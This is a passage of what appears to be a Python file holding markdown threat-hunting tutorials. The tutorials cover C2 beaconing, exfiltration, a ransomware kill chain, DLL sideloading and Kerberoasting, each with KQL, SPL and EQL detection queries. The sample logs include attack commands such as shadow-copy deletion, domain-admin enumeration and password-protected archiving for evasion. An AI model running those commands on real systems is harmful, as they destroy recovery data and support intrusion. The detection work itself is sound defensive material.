The threat intelligence team received a report that a known APT group is using
HTTPS beaconing over port 443 with domain fronting. Network sensors have not
triggered any alerts because the traffic appears to be legitimate HTTPS. You must
hunt through proxy logs to identify potential C2 channels.

**Environment:**
- Zscaler cloud proxy with full SSL inspection
- Squid on-prem proxy for legacy systems
- DNS query logs from Infoblox
- ~500 million proxy log entries per day

## C2 Communication Characteristics

| Pattern | Description | Detection Difficulty |
|---------|-------------|---------------------|
| Fixed interval beaconing | Callbacks every N seconds | Medium |
| Jittered beaconing | N seconds +/- random | Hard |
| Domain fronting | CDN domain hides real C2 | Hard |
| DNS tunneling | Data in DNS TXT/CNAME | Medium |
| HTTP(S) long polling | Persistent connections | Medium |
| Protocol tunneling | C2 over allowed protocols | Hard |

## Sample Log Entries

### Squid proxy log - regular beaconing

```
1707558000.123 FINWS042 TCP_TUNNEL/200 1542 CONNECT cdn-assets.cloudfront[.]net:443 CORP\j.martinez HIER_DIRECT/198.51.100.44
1707558060.891 FINWS042 TCP_TUNNEL/200 1538 CONNECT cdn-assets.cloudfront[.]net:443 CORP\j.martinez HIER_DIRECT/198.51.100.44
1707558121.445 FINWS042 TCP_TUNNEL/200 1540 CONNECT cdn-assets.cloudfront[.]net:443 CORP\j.martinez HIER_DIRECT/198.51.100.44
1707558182.003 FINWS042 TCP_TUNNEL/200 1536 CONNECT cdn-assets.cloudfront[.]net:443 CORP\j.martinez HIER_DIRECT/198.51.100.44
1707558242.667 FINWS042 TCP_TUNNEL/200 1544 CONNECT cdn-assets.cloudfront[.]net:443 CORP\j.martinez HIER_DIRECT/198.51.100.44
```

**Annotation:** Note the ~60-second interval between requests. The response size
is nearly identical each time (~1540 bytes). This is textbook beaconing: fixed
interval, consistent payload size, single destination.

### Zscaler log - domain fronting via CDN

```json
{
  "datetime": "2026-02-10T10:22:14Z",
  "user": "j.martinez@acme.com",
  "srcip": "10.1.0.42",
  "action": "Allowed",
  "hostname": "cdn-assets.cloudfront.net",
  "url": "/api/v2/status",
  "sni": "cdn-assets.cloudfront.net",
  "actual_host": "c2-backend.evil-domain.com",
  "method": "POST",
  "requestsize": 2048,
  "responsesize": 1542,
  "department": "Finance"
}
```

**Annotation:** SSL inspection reveals the `actual_host` header differs from the
SNI/hostname. The CDN is being used as a proxy to the real C2 server.

## Query Examples

### KQL - Detect fixed-interval beaconing

```kql
CommonSecurityLog
| where DeviceVendor == "Zscaler"
| where DestinationHostName != ""
| summarize Timestamps=make_list(TimeGenerated),
            RequestCount=count(),
            AvgResponseSize=avg(ReceivedBytes)
    by SourceIP, DestinationHostName, DestinationPort
| where RequestCount > 50
| extend Intervals = array_sort_asc(Timestamps)
| mv-apply Intervals on (
    extend NextTime = next(Intervals)
    | extend Delta = datetime_diff('second', NextTime, Intervals)
    | where isnotnull(Delta)
    | summarize StdDev=stdev(Delta), AvgInterval=avg(Delta), Count=count()
)
| where StdDev < 5 and AvgInterval between (10 .. 300)
| project SourceIP, DestinationHostName, AvgInterval, StdDev, RequestCount
```

### SPL - Beaconing detection with standard deviation

```spl
index=proxy sourcetype=zscaler:nss
| sort 0 _time
| streamstats current=f last(_time) as prev_time by src_ip, dest_host
| eval interval=_time - prev_time
| where interval > 0
| stats count, avg(interval) as avg_int, stdev(interval) as std_int,
        values(user) as users, sum(bytes_out) as total_out
    by src_ip, dest_host
| where count > 50 AND std_int < 5 AND avg_int > 10 AND avg_int < 300
| eval beacon_score = round((1 - (std_int / avg_int)) * 100, 2)
| where beacon_score > 85
| sort - beacon_score
```

### EQL - High frequency small POST requests

```eql
sequence by source.ip with maxspan=1h
  [http where http.request.method == "POST"
    and http.request.bytes < 4096
    and http.response.bytes < 4096] with runs=20
```

## Correlation Logic

**Beacon scoring algorithm:**

1. Group proxy logs by `(source_ip, dest_host)` pairs
2. Calculate inter-request intervals
3. Compute standard deviation of intervals
4. Score: `beacon_score = (1 - (stdev / mean_interval)) * 100`
5. Threshold: score > 85 = likely beaconing

**Additional enrichment:**
- Check if destination domain was registered recently (< 30 days)
- Check if destination resolves to CDN IP ranges
- Compare user-agent string against baseline for that workstation
- Check if destination appears in threat intel feeds

## Timeline Reconstruction

| Time (UTC) | Event | Detail |
|------------|-------|--------|
| 09:16:22 | First beacon | FINWS042 -> cdn-assets.cloudfront.net (POST /api/v2/status) |
| 09:16:22 - 17:45:00 | Sustained beaconing | ~60s intervals, 512 requests total |
| 11:30:15 | Data upload spike | Response size jumps to 45KB (possible tasking) |
| 11:32:00 | Large POST | 2.1MB POST to /api/v2/upload (possible exfil) |
| 14:00:00 | Interval change | Beacon shifts to 120s interval (operator adjustment) |
| 17:45:22 | Last beacon | Final callback before workstation shutdown |

## Conclusions

- The beaconing had a 99.2% regularity score (stdev=0.8s, mean=60s)
- Domain fronting via CloudFront made the traffic appear as legitimate CDN usage
- SSL inspection was critical; without it, only the SNI would be visible
- The data upload at 11:32 correlates with file access logs on the workstation
- Total estimated data exfiltrated: ~15MB over 8 hours

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Application Layer Protocol: Web Protocols | T1071.001 | Command and Control |
| Proxy: Domain Fronting | T1090.004 | Command and Control |
| Data Encoding: Standard Encoding | T1132.001 | Command and Control |
| Encrypted Channel: Asymmetric Cryptography | T1573.002 | Command and Control |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |
"""
    ))

    # ----------------------------------------------------------------
    # Article 4
    # ----------------------------------------------------------------
    articles.append((
        "Detecting Data Exfiltration from Firewall and DLP Logs",
        ["log-analysis", "data-exfiltration", "firewall", "dlp", "network-security"],
        r"""# Detecting Data Exfiltration from Firewall and DLP Logs

## Scenario Setup

A DLP alert triggered on a finance workstation for a large outbound transfer.
Initial triage shows the user claims it was a legitimate SharePoint upload, but
the byte count and destination do not match any sanctioned cloud service. You
must determine whether data was exfiltrated by correlating firewall session logs,
DLP events, and endpoint activity.

**Environment:**
- Palo Alto Networks PA-5250 perimeter firewall
- Symantec DLP Network Monitor on egress tap
- Microsoft Defender for Endpoint on workstations
- Daily outbound traffic: ~2TB

## Exfiltration Indicators

| Indicator | Normal | Suspicious |
|-----------|--------|------------|
| Single session upload size | < 50MB | > 200MB |
| Upload to new domain | Rare | First-seen domain |
| Time of transfer | Business hours | 02:00-05:00 |
| Protocol | HTTPS to known SaaS | HTTPS to personal cloud |
| Compression before upload | No | Yes (zip/7z creation then upload) |
| DNS resolution | Cached/known | New resolution within 5 min of upload |

## Sample Log Entries

### Palo Alto firewall session log

```
Feb 10 11:32:15 PA-5250 1,2026/02/10 11:32:15,015451234567,TRAFFIC,end,
2305,2026/02/10 11:30:00,10.2.0.55,185.199.110.44,0.0.0.0,0.0.0.0,
Allow-Outbound,CORP\m.chen,,ssl,vsys1,Trust,Untrust,ethernet1/3,ethernet1/2,
Log-Default,456789,1,52431,443,0,0,0x400064,tcp,allow,2621440,51200,2570240,
48,33,15,0,L7,0x0,US,NL,0,12,8,policy-rule-42
```

**Annotation:** Key fields: source 10.2.0.55 (finance subnet), dest 185.199.110.44
(Netherlands), bytes sent = 2,570,240 (~2.5MB payload in this session), total
session bytes = 2,621,440. The `ssl` application and port 443 are standard but
the destination geolocates to NL, not a known SaaS provider.

### DLP alert - sensitive content detected

```json
{
  "timestamp": "2026-02-10T11:31:45Z",
  "policy": "PII-Financial-Data",
  "action": "Alert",
  "severity": "High",
  "source_ip": "10.2.0.55",
  "source_user": "CORP\\m.chen",
  "destination": "185.199.110.44:443",
  "protocol": "HTTPS",
  "matched_rules": [
    "Credit Card Numbers (>10 matches)",
    "SSN Pattern (>5 matches)",
    "Financial Report Template"
  ],
  "file_name": "Q4_Financial_Consolidated.xlsx",
  "file_size": 2483200,
  "file_hash": "sha256:a3f2b1c4d5e6..."
}
```

### Endpoint - file archival before upload

```
Sysmon Event ID 1:
  Time: 2026-02-10T11:28:33Z
  ParentImage: C:\Windows\explorer.exe
  Image: C:\Program Files\7-Zip\7z.exe
  CommandLine: "7z.exe" a -pS3cur3! C:\Users\m.chen\Desktop\backup.7z
               C:\Users\m.chen\Documents\Finance\Q4_*.xlsx
  User: CORP\m.chen
```

**Annotation:** The user compressed finance files with a password (`-pS3cur3!`)
three minutes before the DLP alert. Password-protected archives evade content
inspection.

## Query Examples

### KQL - Large outbound transfers to uncommon destinations

```kql
CommonSecurityLog
| where DeviceVendor == "Palo Alto Networks"
| where Activity == "TRAFFIC" and DeviceAction == "allow"
| where DestinationPort == 443
| where SentBytes > 1000000
| summarize TotalBytesSent=sum(SentBytes),
            SessionCount=count(),
            DistinctDests=dcount(DestinationIP)
    by SourceIP, SourceUserName, DestinationIP, bin(TimeGenerated, 1h)
| where TotalBytesSent > 10000000
| join kind=leftanti (
    CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where SentBytes > 100000
    | distinct DestinationIP
) on DestinationIP
| sort by TotalBytesSent desc
```

### SPL - Correlate DLP alerts with firewall sessions

```spl
index=dlp severity=High action=Alert
| rename source_ip as src_ip, destination as dest
| join src_ip, dest
    [search index=firewall sourcetype=pan:traffic action=allowed
     | eval dest=dest_ip.":".dest_port
     | stats sum(bytes_out) as total_bytes, count as sessions by src_ip, dest]
| eval exfil_mb = round(total_bytes/1048576, 2)
| table _time, src_ip, source_user, dest, matched_rules, file_name, exfil_mb
| sort - exfil_mb
```

### EQL - Archive creation followed by large upload

```eql
sequence by user.name with maxspan=10m
  [process where process.name in ("7z.exe", "rar.exe", "zip.exe")
    and process.args : ("a", "add")]
  [network where network.bytes > 1000000
    and destination.port == 443
    and not cidrmatch(destination.ip, "10.0.0.0/8")]
```

## Correlation Logic

1. **DLP alert** fires on sensitive content in outbound stream
2. **Firewall logs** show total bytes transferred to same dest IP
3. **Endpoint logs** reveal file compression with password protection
4. **DNS logs** show first resolution of dest domain 10 minutes before transfer
5. **Proxy logs** show no prior history of this destination for any user

**Exfiltration confidence scoring:**

| Factor | Weight | Score |
|--------|--------|-------|
| DLP policy match (PII) | 30 | 30/30 |
| First-seen destination | 20 | 20/20 |
| Password-protected archive | 20 | 20/20 |
| Transfer > 1MB | 15 | 15/15 |
| Off-hours activity | 15 | 0/15 |
| **Total** | **100** | **85/100** |

## Timeline Reconstruction

| Time (UTC) | Event | Source | Detail |
|------------|-------|--------|--------|
| 11:20:00 | File access | MDE | m.chen opens Q4 finance files |
| 11:28:33 | Archival | Sysmon | 7z.exe creates password-protected archive |
| 11:29:45 | DNS lookup | Infoblox | First resolution of upload-share[.]nl |
| 11:30:00 | Session start | PA FW | HTTPS session to 185.199.110.44:443 |
| 11:31:45 | DLP alert | Symantec | PII detected in outbound stream |
| 11:32:15 | Session end | PA FW | 2.5MB uploaded to NL destination |

## Conclusions

- Data exfiltration confirmed: Q4 financial data containing PII sent to
  an unregistered file-sharing service in the Netherlands
- The password-protected archive was a deliberate evasion technique
- DLP caught the content because SSL inspection decrypted the stream
- Estimated data loss: 2.5MB of consolidated financial records
- Recommend: block destination IP, preserve workstation for forensics,
  initiate insider threat investigation

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Archive Collected Data: Archive via Utility | T1560.001 | Collection |
| Exfiltration Over Web Service | T1567 | Exfiltration |
| Encrypted Channel | T1573 | Command and Control |
| Data from Local System | T1005 | Collection |
| Automated Collection | T1119 | Collection |
"""
    ))

    # ----------------------------------------------------------------
    # Article 5
    # ----------------------------------------------------------------
    articles.append((
        "Analyzing a Ransomware Kill Chain in SIEM",
        ["log-analysis", "ransomware", "kill-chain", "siem", "incident-response"],
        r"""# Analyzing a Ransomware Kill Chain in SIEM

## Scenario Setup

At 03:42 UTC on a Saturday, automated monitoring detected mass file rename
operations across three file servers. Within 15 minutes, ransom notes appeared
on user desktops. You must reconstruct the full ransomware kill chain using
SIEM data to determine initial access, scope of impact, and whether data was
exfiltrated before encryption.

**Environment:**
- 3 file servers (FILESRV01-03) running Windows Server 2022
- Elastic SIEM with 90-day retention
- Sysmon on all endpoints, Winlogbeat forwarding
- Backup server (BKUPSRV01) on isolated VLAN

## Ransomware Kill Chain Phases

| Phase | Typical Timeframe | Key Log Sources |
|-------|-------------------|-----------------|
| Initial Access | Days to weeks before | Email gateway, proxy, VPN |
| Execution | Minutes | Sysmon Event 1, Security 4688 |
| Persistence | Minutes after access | Sysmon Event 13, Scheduled Tasks |
| Privilege Escalation | Hours | Security 4672, 4648 |
| Discovery | Hours to days | Sysmon Event 1 (net.exe, nltest) |
| Lateral Movement | Hours to days | Security 4624 Type 3/10 |
| Exfiltration | Hours before encryption | Firewall, proxy, DLP |
| Impact (Encryption) | Minutes to hours | Sysmon Event 11, file audit |

## Sample Log Entries

### Initial access - compromised VPN account (days prior)

```json
{
  "timestamp": "2026-02-03T22:15:33Z",
  "event_type": "vpn_auth",
  "user": "svc_backup",
  "source_ip": "45.33.32.156",
  "geo": {"country": "RU", "city": "Moscow"},
  "result": "SUCCESS",
  "mfa": "bypassed - service account exception"
}
```

**Annotation:** Service account `svc_backup` authenticated from Russia. Service
accounts often lack MFA and have excessive privileges. This was the initial
foothold established 7 days before the ransomware deployment.

### Discovery commands (Sysmon Event ID 1)

```
ParentImage: C:\Windows\System32\cmd.exe
Image: C:\Windows\System32\net.exe
CommandLine: net group "Domain Admins" /domain
User: CORP\svc_backup
Time: 2026-02-08T14:22:15Z

Image: C:\Windows\System32\nltest.exe
CommandLine: nltest /dclist:corp.acme.local
User: CORP\svc_backup
Time: 2026-02-08T14:22:48Z

Image: C:\Windows\System32\cmd.exe
CommandLine: cmd /c dir \\FILESRV01\Finance$ /s /b > C:\temp\files.txt
User: CORP\svc_backup
Time: 2026-02-08T14:35:10Z
```

**Annotation:** Classic AD reconnaissance: enumerate domain admins, list DCs,
and map file shares. The output redirection to a temp file indicates data staging.

### Shadow copy deletion (pre-encryption)

```
Sysmon Event ID 1:
  Time: 2026-02-10T03:38:00Z
  Image: C:\Windows\System32\vssadmin.exe
  CommandLine: vssadmin delete shadows /all /quiet
  User: CORP\admin_compromised
  Computer: FILESRV01
```

### Mass file rename (encryption in progress)

```
Sysmon Event ID 11 (File Create):
  Time: 2026-02-10T03:42:15Z
  Image: C:\Users\Public\svchost.exe     <-- masquerading process name
  TargetFilename: \\FILESRV01\Finance$\Q4_Report.xlsx.locked
  Computer: FILESRV01

  (repeated 15,000+ times in 8 minutes)
```

**Annotation:** The ransomware binary masquerades as svchost.exe but runs from
`C:\Users\Public`, not `C:\Windows\System32`. File extension `.locked` is appended.

## Query Examples

### KQL - Detect mass file rename indicating encryption

```kql
DeviceFileEvents
| where ActionType == "FileRenamed"
| where Timestamp between (datetime(2026-02-10T03:00:00Z) .. datetime(2026-02-10T05:00:00Z))
| summarize FileCount=count(),
            Extensions=make_set(tostring(split(FileName, ".")[-1])),
            Devices=make_set(DeviceName)
    by InitiatingProcessFileName, InitiatingProcessFolderPath,
       bin(Timestamp, 1m)
| where FileCount > 100
| sort by FileCount desc
```

### SPL - Full ransomware kill chain timeline

```spl
(index=sysmon EventCode=1 (CommandLine="*vssadmin*delete*" OR
  CommandLine="*wmic*shadowcopy*" OR CommandLine="*bcdedit*/set*"
  OR CommandLine="*net group*Domain Admins*" OR CommandLine="*nltest*"))
OR (index=sysmon EventCode=11 TargetFilename="*.locked")
OR (index=wineventlog EventCode=4624 Logon_Type=3 Account_Name="svc_backup")
OR (index=vpn user="svc_backup")
| eval phase=case(
    index="vpn", "1-Initial Access",
    match(CommandLine, "net group|nltest|net view"), "3-Discovery",
    EventCode=4624, "4-Lateral Movement",
    match(CommandLine, "vssadmin|bcdedit|wmic.*shadow"), "6-Defense Evasion",
    match(TargetFilename, "\.locked$"), "7-Impact",
    1=1, "Other")
| sort _time
| table _time, phase, Computer, User, CommandLine, TargetFilename, src_ip
```

### EQL - Shadow copy deletion followed by mass file operations

```eql
sequence by host.name with maxspan=15m
  [process where process.name == "vssadmin.exe"
    and process.args : "delete"]
  [file where event.action == "rename"
    and file.extension == "locked"] with runs=50
```

## Correlation Logic

Combine multiple log sources into a unified kill chain:

```
VPN Logs (T-7 days) -> Authentication from anomalous geo
    |
Security Logs (T-2 days) -> Lateral movement via Type 3 logons
    |
Sysmon Logs (T-2 days) -> AD reconnaissance commands
    |
Firewall Logs (T-4 hours) -> Large outbound transfer (exfil before encryption)
    |
Sysmon Logs (T-15 min) -> VSS deletion, backup service stopped
    |
Sysmon Logs (T=0) -> Mass file rename = encryption started
```

## Timeline Reconstruction

| Time (UTC) | Phase | Event | Source |
|------------|-------|-------|--------|
| Feb 03 22:15 | Initial Access | svc_backup VPN from Russia | VPN |
| Feb 08 14:22 | Discovery | Domain admin enumeration | Sysmon |
| Feb 08 14:35 | Discovery | File share mapping | Sysmon |
| Feb 09 02:00 | Lateral Movement | svc_backup -> 5 servers | Security 4624 |
| Feb 10 00:15 | Exfiltration | 4.2GB upload to cloud storage | Firewall |
| Feb 10 03:35 | Defense Evasion | Backup agent service stopped | Sysmon |
| Feb 10 03:38 | Defense Evasion | VSS shadow copies deleted | Sysmon |
| Feb 10 03:40 | Defense Evasion | bcdedit recovery disabled | Sysmon |
| Feb 10 03:42 | Impact | Encryption begins on FILESRV01 | Sysmon |
| Feb 10 03:44 | Impact | Encryption spreads to FILESRV02, 03 | Sysmon |
| Feb 10 03:50 | Impact | Ransom note dropped on desktops | Sysmon |

## Conclusions

- Total dwell time: **7 days** from initial access to encryption
- The attacker used a service account with VPN access and no MFA
- Data exfiltration of 4.2GB occurred 3.5 hours before encryption (double extortion)
- Shadow copy deletion and backup service disruption ensured no easy recovery
- 45,000+ files encrypted across 3 file servers in under 10 minutes
- Recovery required offline backups; estimated business impact: 48 hours downtime

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Valid Accounts: Domain Accounts | T1078.002 | Initial Access |
| Account Discovery: Domain Account | T1087.002 | Discovery |
| Network Share Discovery | T1135 | Discovery |
| Inhibit System Recovery | T1490 | Impact |
| Data Encrypted for Impact | T1486 | Impact |
| Exfiltration Over Web Service | T1567 | Exfiltration |
"""
    ))

    # ----------------------------------------------------------------
    # Article 6
    # ----------------------------------------------------------------
    articles.append((
        "Correlating Endpoint and Network Logs for APT Detection",
        ["log-analysis", "apt", "correlation", "endpoint", "network", "threat-hunting"],
        r"""# Correlating Endpoint and Network Logs for APT Detection

## Scenario Setup

Threat intelligence indicates that APT-41 (Double Dragon) is targeting your
industry vertical using custom malware with living-off-the-land techniques.
You have no IOCs specific to your environment. Your mission is to correlate
endpoint telemetry with network flow data to identify stealthy behaviors that
neither source would reveal alone.

**Environment:**
- CrowdStrike Falcon on endpoints (process, network, file events)
- Zeek (Bro) network sensor on core switch span port
- Palo Alto PA-5250 firewall with App-ID and URL filtering
- Elastic SIEM aggregating all sources

## Why Correlation Matters

Single-source detection misses multi-stage attacks:

| Attack Step | Endpoint Only | Network Only | Correlated |
|-------------|---------------|--------------|------------|
| DLL sideloading | See process load DLL | Nothing | See process + resulting C2 traffic |
| DNS tunneling | See process making DNS | See DNS queries | Map process to specific DNS tunnel |
| Stolen creds RDP | See logon event | See RDP flow | Match logon account to source host |
| Data staging | See file copy | Nothing | See staging + subsequent exfil flow |

## Sample Log Entries

### Endpoint - DLL sideloading into legitimate process

```json
{
  "source": "CrowdStrike",
  "event_type": "ProcessRollup2",
  "timestamp": "2026-02-10T08:15:22Z",
  "hostname": "DEVWS033",
  "parent_process": "explorer.exe",
  "process": "C:\\Program Files\\Notepad++\\notepad++.exe",
  "loaded_dlls": [
    "C:\\Program Files\\Notepad++\\SciLexer.dll",
    "C:\\Program Files\\Notepad++\\updater.dll"
  ],
  "unsigned_dlls": ["updater.dll"],
  "pid": 8844,
  "user": "CORP\\d.kim"
}
```

**Annotation:** `updater.dll` is unsigned and not part of the standard Notepad++
distribution. This is a classic DLL sideloading technique. The legitimate
application loads a malicious DLL that runs in its process context.

### Network - corresponding C2 from same host (Zeek conn.log)

```
ts=1707557722.000 uid=CYzWaP3 orig_h=10.1.0.33 orig_p=49152
resp_h=203.0.113.55 resp_p=443 proto=tcp service=ssl
duration=3600.5 orig_bytes=1024 resp_bytes=8192
conn_state=SF history=ShAdDafF
```

**Annotation:** A 1-hour persistent SSL connection from DEVWS033 (10.1.0.33) to
an external IP. The low byte count (1KB sent, 8KB received) over a long duration
suggests a C2 channel in sleep mode, waiting for commands.

### Zeek - DNS query for newly registered domain

```
ts=1707557700.000 uid=DxT2 query=updates.legit-software[.]xyz
qtype=A rcode=NOERROR answers=203.0.113.55
TTL=60
```

**Annotation:** The DNS resolution happened 22 seconds before the SSL connection.
The domain `legit-software[.]xyz` registered 5 days ago (WHOIS enrichment).
The low TTL (60s) allows the operator to quickly change C2 infrastructure.

## Query Examples

### KQL - Join endpoint process to network connections

```kql
let endpoint_procs = DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName == "notepad++.exe"
| project DeviceName, ProcessId, Timestamp, FileName, InitiatingProcessFileName;
let network_conns = DeviceNetworkEvents
| where Timestamp > ago(24h)
| where RemoteIPType == "Public"
| project DeviceName, InitiatingProcessId, RemoteIP, RemotePort,
          Timestamp, InitiatingProcessFileName;
endpoint_procs
| join kind=inner network_conns
    on $left.DeviceName == $right.DeviceName,
       $left.ProcessId == $right.InitiatingProcessId
| project Timestamp=Timestamp1, DeviceName, FileName,
          RemoteIP, RemotePort
| sort by Timestamp asc
```

### SPL - Cross-source correlation: endpoint process + Zeek flow

```spl
index=crowdstrike event_type=ProcessRollup2 unsigned_dlls=*
| rename hostname as src_host, pid as process_id
| join type=inner src_host
    [search index=zeek sourcetype=zeek:conn
     | where orig_bytes < 5000 AND duration > 600
     | rename orig_h as src_ip
     | lookup host_to_ip src_ip OUTPUT hostname as src_host]
| table _time, src_host, process, unsigned_dlls, resp_h, resp_p, duration
| sort _time
```

### EQL - Unsigned DLL load followed by external connection

```eql
sequence by host.name, process.pid with maxspan=5m
  [library where not dll.code_signature.trusted
    and dll.name != null
    and process.name : ("notepad++.exe","vlc.exe","7zFM.exe")]
  [network where destination.ip != null
    and not cidrmatch(destination.ip, "10.0.0.0/8","172.16.0.0/12","192.168.0.0/16")]
```

## Correlation Logic

**Multi-source correlation pipeline:**

```
Step 1: Endpoint -> Find processes with unsigned DLL loads
Step 2: Map process PID + hostname to network connections (same PID)
Step 3: Zeek -> Find corresponding flows by src_ip + timestamp window
Step 4: Zeek DNS -> Resolve destination IPs to domains
Step 5: Enrich domains with WHOIS age, TI reputation, certificate data
Step 6: Score based on: unsigned DLL + new domain + long-lived connection + low bandwidth
```

**Scoring matrix:**

| Signal | Points |
|--------|--------|
| Unsigned DLL in legitimate app | 25 |
| Outbound connection to new domain (< 30 days) | 20 |
| Long-lived connection (> 30 min) | 15 |
| Low bandwidth C2 pattern | 15 |
| Self-signed or free TLS certificate | 10 |
| Non-standard JA3 hash | 10 |
| Process hollowing indicators | 5 |
| **Threshold for investigation** | **60** |

## Timeline Reconstruction

| Time (UTC) | Source | Event |
|------------|--------|-------|
| 08:10:00 | CrowdStrike | Notepad++ launched by d.kim |
| 08:10:02 | CrowdStrike | Unsigned updater.dll loaded |
| 08:15:00 | Zeek DNS | Resolution of legit-software[.]xyz -> 203.0.113.55 |
| 08:15:22 | Zeek conn | SSL session to 203.0.113.55:443 begins |
| 09:15:22 | Zeek conn | Session still active (1 hour, minimal data) |
| 10:22:00 | CrowdStrike | PowerShell spawned by notepad++.exe (tasking) |
| 10:22:15 | Zeek conn | Spike in data: 45KB received (command delivery) |
| 10:25:00 | CrowdStrike | net.exe and nltest.exe spawned (recon) |

## Conclusions

- Neither endpoint nor network data alone was conclusive
- Endpoint showed an unsigned DLL but no immediate malicious behavior
- Network showed a long SSL session but to an uncategorized domain
- Combined analysis revealed: DLL sideloading -> C2 channel -> remote tasking
- The APT maintained stealth by using a legitimate application as the process host
- JA3 fingerprint of the SSL connection matched known APT-41 tooling

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Hijack Execution Flow: DLL Side-Loading | T1574.002 | Defense Evasion |
| Application Layer Protocol: Web Protocols | T1071.001 | Command and Control |
| System Network Configuration Discovery | T1016 | Discovery |
| Domain Trust Discovery | T1482 | Discovery |
| Ingress Tool Transfer | T1105 | Command and Control |
"""
    ))

    # ----------------------------------------------------------------
    # Article 7
    # ----------------------------------------------------------------
    articles.append((
        "Spotting Credential Abuse in Kerberos and NTLM Logs",
        ["log-analysis", "credential-abuse", "kerberos", "ntlm", "active-directory"],
        r"""# Spotting Credential Abuse in Kerberos and NTLM Logs

## Scenario Setup

The SOC received a threat intel advisory about credential theft campaigns
targeting organizations in your sector. Known techniques include Kerberoasting,
AS-REP roasting, Golden Ticket attacks, and pass-the-hash. You must proactively
hunt through authentication logs to detect any signs of credential abuse.

**Environment:**
- Active Directory: corp.acme.local (Functional level 2016)
- 2 Domain Controllers: DC01, DC02 (Windows Server 2022)
- 4,500 user accounts, 380 service accounts
- Advanced Audit Policy: Kerberos auth events enabled

## Kerberos Authentication Flow

```
Client         KDC (DC)         Service
  |               |               |
  |--AS-REQ------>|               |   Event 4768 (TGT Request)
  |<--AS-REP------|               |   (contains TGT)
  |               |               |
  |--TGS-REQ---->|               |   Event 4769 (Service Ticket)
  |<--TGS-REP----|               |   (contains Service Ticket)
  |               |               |
  |------------Service Request--->|   Event 4624 (Logon)
```

## Attack Signatures in Logs

| Attack | Event ID | Key Indicator |
|--------|----------|---------------|
| Kerberoasting | 4769 | RC4 encryption (0x17) for SPN-enabled accounts |
| AS-REP Roasting | 4768 | Pre-auth not required, RC4 encryption |
| Golden Ticket | 4769 | TGT issued with abnormal lifetime or forged PAC |
| Pass-the-Ticket | 4768 | TGT request from unusual source for that account |
| Silver Ticket | 4624 | Logon without corresponding 4769 on DC |
| Overpass-the-Hash | 4768 | RC4 (0x17) when AES should be used |

## Sample Log Entries

### Kerberoasting - mass SPN ticket requests (Event 4769)

```
Event ID: 4769
Time: 2026-02-10T14:33:22Z
Account: j.martinez@CORP.ACME.LOCAL
Service: MSSQLSvc/SQLSRV01.corp.acme.local:1433
Client Address: 10.1.0.42
Ticket Encryption Type: 0x17    <-- RC4_HMAC_MD5

Event ID: 4769
Time: 2026-02-10T14:33:23Z
Account: j.martinez@CORP.ACME.LOCAL
Service: HTTP/WEBSRV01.corp.acme.local
Ticket Encryption Type: 0x17

Event ID: 4769
Time: 2026-02-10T14:33:24Z
Account: j.martinez@CORP.ACME.LOCAL
Service: CIFS/FILESRV01.corp.acme.local
Ticket Encryption Type: 0x17

(12 more in the same second)
```

**Annotation:** A single user requesting RC4-encrypted service tickets for 15
different SPNs within 2 seconds is a textbook Kerberoasting indicator. Legitimate
users rarely request more than 1-2 service tickets in rapid succession.

### Golden Ticket usage (Event 4769 anomaly)

```
Event ID: 4769
Time: 2026-02-10T15:45:00Z
Account: admin_compromised@CORP.ACME.LOCAL
Service: krbtgt/CORP.ACME.LOCAL
Client Address: 10.1.0.42
Ticket Encryption Type: 0x17
Ticket Options: 0x40810000

-- Corresponding DC log shows NO prior 4768 for this account --
```

**Annotation:** A service ticket request using a TGT that was never issued by
the DC (no matching 4768 event). This is a forged Golden Ticket. The RC4
encryption further confirms the attacker used the NTLM hash of the krbtgt account.

### NTLM relay attack (Event 4776)

```
Event ID: 4776
Time: 2026-02-10T16:22:11Z
Authentication Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account: svc_deploy
Source Workstation: ATTACKER-VM      <-- Unknown workstation
Error Code: 0x0 (Success)
```

## Query Examples

### KQL - Detect Kerberoasting (mass SPN requests with RC4)

```kql
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| where ServiceName != "krbtgt"
| summarize SPNCount=dcount(ServiceName),
            SPNs=make_set(ServiceName),
            FirstRequest=min(TimeGenerated),
            LastRequest=max(TimeGenerated)
    by TargetAccount, IpAddress
| where SPNCount > 5
| extend TimeSpanSeconds = datetime_diff('second', LastRequest, FirstRequest)
| where TimeSpanSeconds < 60
| sort by SPNCount desc
```

### SPL - Golden Ticket detection (TGS without TGT)

```spl
index=wineventlog EventCode=4769 Service_Name=krbtgt
| rename Account_Name as account, Client_Address as src_ip
| join type=left account
    [search index=wineventlog EventCode=4768
     | rename Account_Name as account, Client_Address as tgt_src_ip
     | where _time > relative_time(now(), "-1h")
     | stats latest(_time) as tgt_time, latest(tgt_src_ip) as tgt_source by account]
| where isnull(tgt_time) OR (src_ip != tgt_source)
| table _time, account, src_ip, tgt_source, Ticket_Encryption_Type
```

### EQL - AS-REP roasting pattern

```eql
sequence by source.ip with maxspan=30s
  [authentication where event.code == "4768"
    and winlog.event_data.PreAuthType == "0"
    and winlog.event_data.TicketEncryptionType == "0x17"] with runs=3
```

## Correlation Logic

**Kerberoasting detection pipeline:**

1. Collect all Event 4769 with encryption type 0x17 (RC4)
2. Exclude machine accounts (name ending in `$`)
3. Exclude the krbtgt service itself
4. Group by requesting account and source IP
5. Count distinct SPNs requested within a sliding 60-second window
6. Alert if count > 5 SPNs in 60 seconds

**Golden Ticket detection pipeline:**

1. For every 4769 (TGS request), look for a matching 4768 (TGT request)
   from the same account within the prior 10 hours
2. If no 4768 exists, the TGT was not issued by this KDC = potential forgery
3. Enrich with: source IP reputation, account type, time of day
4. Cross-check: does the account normally authenticate from this source?

## Timeline Reconstruction

| Time (UTC) | Event ID | Detail |
|------------|----------|--------|
| 14:30:00 | 4624 | j.martinez logon to ENGWS042 (compromised) |
| 14:33:22 | 4769 x15 | Mass SPN requests with RC4 (Kerberoasting) |
| 14:45:00 | - | Offline cracking of service account passwords |
| 15:00:00 | 4648 | j.martinez uses svc_deploy credentials |
| 15:10:00 | 4624 | svc_deploy logon to DC01 |
| 15:12:00 | 4662 | DCSync replication request for krbtgt |
